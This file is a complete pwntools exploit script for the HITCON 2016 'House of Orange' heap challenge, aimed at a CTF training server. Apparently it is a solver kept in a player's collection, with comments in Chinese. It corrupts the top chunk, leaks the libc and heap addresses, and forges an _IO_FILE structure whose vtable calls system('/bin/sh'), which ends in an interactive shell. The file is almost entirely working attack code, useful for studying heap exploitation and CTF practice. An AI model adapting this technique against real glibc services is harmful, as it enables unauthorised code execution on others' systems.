from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './houseoforange_hitcon_2016'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29069) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content,price,color):
    sla(b'Your choice : ',b'1')
    sla(b'Length of name :',int2bytes(len))
    sa(b'Name :',content)
    sla(b'Price of Orange:', int2bytes(price))
    sla(b'Color of Orange:', int2bytes(color))

def show():
    sla(b'Your choice : ',b'2')

def edit(len,content,price,color):
    sla(b'Your choice : ',b'3')
    sla(b'Length of name :',int2bytes(len))
    sa(b'Name:',content)
    sla(b'Price of Orange: ', int2bytes(price))
    sla(b'Color of Orange: ', int2bytes(color))

# def delete(index):
#     sla(b':',b'4')
#     sla(b':',int2bytes(index))

#change top chunk size
add(0x30,b'aaaa',0x1234,0xddaa)
payload = b'a'*0x30 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)
edit(len(payload), payload, 666, 0xddaa)

#unsorted_leek->libc base
add(0x1000,b'a',0x1234,0xddaa)
add(0x400,b'a'*8,199,2)
show()
#其实我觉得这里应该是main_arena+88的，但动调出来确实是main_arena+1640
#而且切割剩下的部分是main_arena+88
libc.address = uu64(ru(b'\x7f',drop=False)[-6:]) - 1640 - 0x10 - libc.symbols['__malloc_hook']
log.success('libc base '+hex(libc.address))
io_list_all = libc.symbols['_IO_list_all']
system_addr = libc.symbols['system']

#large_bin_leak->heap base
payload = b'a'*0x10
edit(0x10,payload,199,2)
show()
ru(payload)
heap_address = uu64(ru(b'\n').strip())
heap_base = heap_address - 0xe0
log.success('heap base '+hex(heap_base))

#frop
payload = b'a'*0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)
fake_file = b'/bin/sh\x00' + p64(0x61) #fake size -> small bin
fake_file += p64(0) + p64(io_list_all - 0x10) #fake bk
fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
fake_file = fake_file.ljust(0xc0,b'\x00')
fake_file += p64(0) * 3
fake_file += p64(heap_base + 0x5e8) #vtable ptr
fake_file += p64(0) * 2
fake_file += p64(system_addr) #vtable[3] == system
payload += fake_file
edit(len(payload),payload,666,2)
# dbg()
# payload = flat(p64(0) * 3 + p64(system_addr), #vtable[3] == system
#             0x400 * "\x01",
#             "/bin/sh\x00",
#             0x61, #fake size -> small bin #fake bk
#             0,
#             io_list_all - 0x10,
#             0,
#             0x1, #_IO_write_base < _IO_write_ptr
#             0xa8 * b"\x00", #前面一共0xd8字节
#             heap_address+0x10 #0xd8后为vtable ptr
#             )
# edit(len(payload),payload,666,2)


# end
sla(b'Your choice : ', b'1')

itr()